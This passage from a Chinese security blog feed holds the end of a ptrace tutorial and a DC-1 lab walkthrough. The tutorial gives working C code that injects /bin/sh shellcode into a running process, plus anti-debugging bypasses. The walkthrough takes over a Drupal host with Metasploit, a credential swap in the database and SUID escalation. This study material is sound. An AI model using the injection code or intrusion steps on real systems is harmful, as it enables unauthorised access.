class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;user.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;ptrace-abi.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">const int long_size &#x3D; sizeof(long);</span><br><span class="line"></span><br><span class="line">&#x2F;*主要通过PTRACE_PEEKDATA获取内存中的内容*&#x2F;</span><br><span class="line">void getdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *backup;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">    &#125;data;</span><br><span class="line"></span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len&#x2F;long_size;</span><br><span class="line">    backup &#x3D; str;</span><br><span class="line"></span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        data.val &#x3D; ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);</span><br><span class="line">        memcpy(backup,data.chars,long_size);</span><br><span class="line">        i++;</span><br><span class="line">        backup +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        data.val &#x3D; ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);</span><br><span class="line">        memcpy(backup, data.chars, j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;*与getdata相反，主要通过PTRACE_POKEDATA向内存写内容*&#x2F;</span><br><span class="line">void putdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *code;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">     &#125;data;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len &#x2F; long_size;</span><br><span class="line">    code &#x3D; str;</span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        memcpy(data.chars, code, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);&#x2F;*函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。*&#x2F;</span><br><span class="line">        ++i;</span><br><span class="line">        code +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        memcpy(data.chars, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   </span><br><span class="line">    pid_t traced_process;&#x2F;&#x2F;实际就是int类型</span><br><span class="line">    struct user_regs_struct regs, newregs;&#x2F;&#x2F;定义数据寄存器数据结构的两个变量，regs，newregs</span><br><span class="line">    long ins;</span><br><span class="line">    &#x2F;*</span><br><span class="line">    struct user_regs_struct &#123;</span><br><span class="line">    unsigned long    r15;</span><br><span class="line">    unsigned long    r14;</span><br><span class="line">    unsigned long    r13;</span><br><span class="line">    unsigned long    r12;</span><br><span class="line">    unsigned long    bp;</span><br><span class="line">    unsigned long    bx;</span><br><span class="line">    unsigned long    r11;</span><br><span class="line">    unsigned long    r10;</span><br><span class="line">    unsigned long    r9;</span><br><span class="line">    unsigned long    r8;</span><br><span class="line">    unsigned long    ax;</span><br><span class="line">    unsigned long    cx;</span><br><span class="line">    unsigned long    dx;</span><br><span class="line">    unsigned long    si;</span><br><span class="line">    unsigned long    di;</span><br><span class="line">    unsigned long    orig_ax;</span><br><span class="line">    unsigned long    ip;</span><br><span class="line">    unsigned long    cs;</span><br><span class="line">    unsigned long    flags;</span><br><span class="line">    unsigned long    sp;</span><br><span class="line">    unsigned long    ss;</span><br><span class="line">    unsigned long    fs_base;</span><br><span class="line">    unsigned long    gs_base;</span><br><span class="line">    unsigned long    ds;</span><br><span class="line">    unsigned long    es;</span><br><span class="line">    unsigned long    fs;</span><br><span class="line">    unsigned long    gs;</span><br><span class="line">&#125;;*&#x2F;</span><br><span class="line">    &#x2F;* int 0x80, int 3 *&#x2F;</span><br><span class="line">    char code[] &#x3D; &#123;0xcd,0x80,0xcc,0&#125;; &#x2F;&#x2F;定义字符数组，存的是将要插入的机器码</span><br><span class="line">    char backup[4]; &#x2F;&#x2F;定义接收原内存机器码的字符数组，这里应该和code[]字符数量相对应</span><br><span class="line">    traced_process &#x3D; atoi(argv[1]); &#x2F;&#x2F;这里把传入的pid转换成int类型</span><br><span class="line">    </span><br><span class="line">    &#x2F;*attack指定pid进程，traced_process*&#x2F;</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);&#x2F;&#x2F;跟踪pid进程</span><br><span class="line">    wait(NULL); &#x2F;&#x2F;等待系统通知</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process, NULL, &amp;regs);&#x2F;*获取目标进程的所有寄存器值，存入regs结构体变量中，为以后恢复原rip,以及各个寄存器的值做准备*&#x2F;</span><br><span class="line">    printf(&quot;eip&#x3D;%lld\n&quot;,regs.rip);</span><br><span class="line">    getdata(traced_process, regs.rip, backup, 3);&#x2F;* 将rip指向地址中的机器码备份到backup中*&#x2F;</span><br><span class="line">    putdata(traced_process, regs.rip, code, 3); &#x2F;* 将int 0x80, int 3指令的机器码写入rip指向内存地址中，int 0x80长度为2，int3长度为1*&#x2F;</span><br><span class="line">    x</span><br><span class="line">    &#x2F;* 让目标进程继续执行并执行我们插入的int 0x80，int 3指令 *&#x2F;</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, NULL, NULL);</span><br><span class="line">    wait(NULL);&#x2F;&#x2F;等待系统通知</span><br><span class="line">    printf(&quot;This process is attacked by 0xAXSDD! Press &lt;enter&gt; to continue!&quot;);</span><br><span class="line">    getchar();&#x2F;&#x2F;捕获一个&lt;enter&gt;输入</span><br><span class="line">    putdata(traced_process, regs.rip, backup, 3); &#x2F;*将backup原指令机器码恢复到原rip指向的地址中*&#x2F;</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs); &#x2F;* 让rip指向的内存地址恢复到原本指向的地址，让目标进程继续执行，恢复rip指针 *&#x2F;</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);&#x2F;* 结束跟踪*&#x2F;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码编译如果使用32位编译，相应rip改成eip，64位编译则不需要改。<br>测试用例，用个简单的c语言程序（32位编译）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;    </span><br><span class="line">    printf(&quot;pid&#x3D;%d\n&quot;,getpid());</span><br><span class="line">    for(int num&#x3D;0;num&lt;20;num++)</span><br><span class="line">    &#123;</span><br><span class="line">    printf(&quot;num &#x3D; %d\n&quot;,num);</span><br><span class="line">    sleep(2);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我执行hacker程序的时候，hellword程序将被暂停（记得sudo执行hacker）</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4153844234591.png"></p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1161212972586.png"></p><p>这里相当于劫持rip指针，而rip指针指向的地址将是即将执行的指令的地址。</p><p>稍微变动一下，直接插入一小段shellcode代码。</p><p>我们得明白有这几种情况：</p><ol><li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。/<em>下面得示例就用的这种方式</em>/</li><li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li><li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li><li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;user.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;ptrace-abi.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">const int long_size &#x3D; sizeof(long);</span><br><span class="line">&#x2F;*通过PTRACE_POKEDATA向内存写内容*&#x2F;</span><br><span class="line">void putdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *code;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">     &#125;data;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len &#x2F; long_size;</span><br><span class="line">    code &#x3D; str;</span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        memcpy(data.chars, code, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        code +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        memcpy(data.chars, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   pid_t traced_process;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line">    long ins;</span><br><span class="line">    int len &#x3D; 25;</span><br><span class="line">    char insertcode[] &#x3D; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;&#x2F;&#x2F;shellcode</span><br><span class="line">    traced_process &#x3D; atoi(argv[1]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);&#x2F;&#x2F;跟踪进程</span><br><span class="line">    wait(NULL);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,NULL, &amp;regs);&#x2F;&#x2F;当前所有寄存器的值</span><br><span class="line">    putdata(traced_process,regs.eip,insertcode, len);&#x2F;&#x2F;写入shellcode</span><br><span class="line">    regs.eip +&#x3D;2 ;&#x2F;&#x2F;修改rip的值，指向我们注入的shellcode</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs);&#x2F;&#x2F;把修改后的寄存器的值写入被跟踪的进程</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process,NULL, NULL);&#x2F;&#x2F;被跟踪的进程继续执行</span><br><span class="line">    printf(&quot;This process is attacked by 0xAXSDD! Press &lt;enter&gt; to continue!&quot;);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,NULL, NULL);&#x2F;&#x2F;结束跟踪</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有恢复到原先执行状态，因为我们直接getshell，不需要再返回到原程序中了。<br>运行效果截图<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4265323362.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3628852827.png"></p><h2 id="绕过简单的ptrace"><a href="#绕过简单的ptrace" class="headerlink" title="绕过简单的ptrace"></a>绕过简单的ptrace</h2><p>上面谈论到ptrace在隐藏的过程中的攻防博弈，并没有说如何绕过ptrace，接下来我们讲如何绕过ptrace一些手段。</p><h3 id="1-通过gdb修改eax（64位rax）中的返回值来绕过ptrace"><a href="#1-通过gdb修改eax（64位rax）中的返回值来绕过ptrace" class="headerlink" title="1.通过gdb修改eax（64位rax）中的返回值来绕过ptrace"></a>1.通过gdb修改eax（64位rax）中的返回值来绕过ptrace</h3><p>理论依据：像这样的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#x3D;&#x3D;-1 )&#x2F;&#x2F;这里就直接先执行了ptrace(PTRACE_TRACEME, 0, 0, 0)，表示此程序已经被追踪</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace me！\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace me！\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我这里编译为64位<br>通过函数的返回值是否为-1来判断，是否正在被调试，如果我们直接修改ptrace的返回值，就可以绕过判断，ptrace函数执行之后的返回值将会保存在rax寄存器中，所以我们只需要在ptrace函数那里下断点，然后等ptrace函数结束后，利用set $rax=0指令来设置rax的值，那么就会绕过判断，就能继续调试程序。</p><p>演示：<br>直接sudo gdb hellword3进行gdb调试</p><p>然后输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch syscall ptrace</span><br></pre></td></tr></table></figure><p>然后c继续执行，第一次暂停是发生在刚开始调用ptrace，然后继续n，n，直到返回到主函数，比较rax的值时候，注意，我们必须得在ptrace执行完成之后，返回到主函数时才更改rax的值</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/153030470666.png"></p><p>可以看到正常ptrace运行完之后，rax中的值为-1（32位为eax）</p><p>输入命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $rax&#x3D;0</span><br></pre></td></tr></table></figure><p>然后继续运行，成功绕过ptrace反调试</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2179340291.png"></p><h3 id="2-直接通过Binary-Ninja查找ptrace调用然后nop替换"><a href="#2-直接通过Binary-Ninja查找ptrace调用然后nop替换" class="headerlink" title="2.直接通过Binary Ninja查找ptrace调用然后nop替换"></a>2.直接通过Binary Ninja查找ptrace调用然后nop替换</h3><p>直接通过搜索文本，然后找到调用ptrace的地方</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/367231987834.png"></p><p>直接选中这一行，然后右键，patch然后直接换成nop，就欧克了，然后另存！</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1639554964.png"></p><h3 id="3-使用LD-PRELOAD来劫持ptrace函数的调用"><a href="#3-使用LD-PRELOAD来劫持ptrace函数的调用" class="headerlink" title="3.使用LD_PRELOAD来劫持ptrace函数的调用"></a>3.使用LD_PRELOAD来劫持ptrace函数的调用</h3><p>这里只针对那些动态链接共享库的程序，局限性很大，通过创键本地自定义的伪造库，使用LD_PRELOAD来劫持ptrace调用库为我们自定义的伪造库，这样就起到了狸猫换太子的效果！</p><p>用的命令，共享库文件代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">long ptrace(int request, int pid, int addr, int data)</span><br><span class="line">&#123;</span><br><span class="line">     return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>编译成共享库文件，然后LD_PRELOAD劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ptrace.c -o ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br><span class="line">export LD_PRELOAD&#x3D;&quot;&#x2F;home&#x2F;hacker&#x2F;Reverse_debugging&#x2F;ptrace&#x2F;ptracE.SO&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3920549679.png"></p><p>其他绕过反调试手法具体程序具体分析，以一变应万变！</p><p>完结完结！！！撒花撒花</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ptrace </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机渗透测试报告</title>
      <link href="2021/03/03/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>2021/03/03/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<blockquote><p>立个flag：一天一个DC机（滑稽 </p><p>下载地址：<a href="https://harvey.plus/2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/#DC%E9%9D%B6%E6%9C%BA1-9">https://harvey.plus/2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/#DC%E9%9D%B6%E6%9C%BA1-9</a></p></blockquote><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>DC-1（nat模式）；kali（nat模式）<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2023766834.png" alt="img"></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>打开DC-1页面如下：（没给账号密码需要自己渗透进去<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/493447337.png" alt="img"><br>首先我们对其进行内网扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/922758081.png" alt="img"><br>这里我直接浏览器对其访问发现的<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1593893493.png" alt="img"><br>Wappalyzer查看其服务信息发现cms是Drupal 7<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/384079129.png" alt="img"></p><p>或者用nmap扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.232.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1783899252.png" alt="img"></p><p>接着扫波目录，发现都没啥卵用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.232.141&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1526011025.png" alt="img"></p><h3 id="漏洞攻击"><a href="#漏洞攻击" class="headerlink" title="漏洞攻击"></a>漏洞攻击</h3><p>msf搜索目标cms版本漏洞，实现渗透</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1406619024.png" alt="img"><br>emmm，这里我们就用最新的漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 6</span><br><span class="line">set rhost 192.168.232.141</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2078141204.png" alt="img"></p><p>芜湖，exit后选择4（第二新的）成功getshell</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/291583468.png"></p><p>反弹式的shell，进入交互界面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class="line"># 产生一个原生的终端</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/118672141.png"></p><p>cat查看flag1.txt得到flag1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2529118697.png"></p><p>Every good CMS needs a config file =》 每个好的CMS都需要一个配置文件<br>于是乎我们去查查他的配置文件得到flag2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd sites</span><br><span class="line">ls</span><br><span class="line">cd default</span><br><span class="line">ls</span><br><span class="line">cat settings.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/577679575.png"></p><p>这里我们成功拿到数据库的账号密码，所以我们就登录进数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">根据上面得知的信息输入密码：R0ck3t</span><br><span class="line">show databases;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1413717378.png"></p><p>接着查询数据库信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3575639081.png"></p><p>接着查表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show tables;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1174575635.png"></p><p>发现关键信息users，查询里面的字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1026973591.png"></p><p>得出账号密码，但是密码是hash加密过的，所以我们只能生成一个密码并得到其hash值进行替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php .&#x2F;scripts&#x2F;password-hash.sh 123456</span><br><span class="line">UPDATE users SET pass &#x3D; &#39;$S$DCJ9lkm5vxZFYzL4GsDQnRiKBURAPyzOv7gz3Zb&#x2F;q9ZrOuZZ7Paf&#39; where uid&#x3D;1;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3625564732.png"></p><p>最后成功登录进去得到flag3<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1912687939.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3889874170.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/775524102.png"></p><p>提示我们：特殊的PERMS可以帮助找到密码-但您需要-exec该命令来确定如何获取隐藏的内容。<br>通过 <code>find / -perm -4000</code> 寻找权限是-4000的文件即查找有特殊权限的命令<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3168087153.png"></p><p>利用find提权获取root权限，得到flag4<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/565400426.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3079080422.png"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-图片隐写那些事儿</title>
      <link href="2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/"/>
      <url>2021/02/28/CTF-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%82%A3%E4%BA%9B%E4%BA%8B%E5%84%BF/</url>
      
